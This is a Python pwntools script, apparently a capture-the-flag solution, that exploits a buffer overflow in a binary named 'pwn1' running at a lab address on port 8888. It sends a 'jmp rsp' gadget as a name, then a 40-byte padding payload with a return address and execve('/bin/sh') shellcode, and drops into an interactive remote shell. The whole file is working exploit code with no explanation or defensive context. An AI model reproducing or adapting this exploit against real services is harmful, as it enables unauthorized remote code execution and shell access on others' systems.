#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'

jmp_shellcode = asm('jmp rsp;')

shellcode = b'\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'

_id = 0x6020A0

# io = process('./pwn1')
# exe = ELF('./pwn1')
io = remote('172.16.5.7', 8888)


offset = 40

io.sendlineafter('your name? : ', jmp_shellcode)
io.sendlineafter('> ', '1')

pls = [
    'a' * offset,
    p64(_id),
    shellcode,
]
payload = ''.join(pls)

# raw_input('w')

io.sendlineafter('\n', payload)


io.interactive()
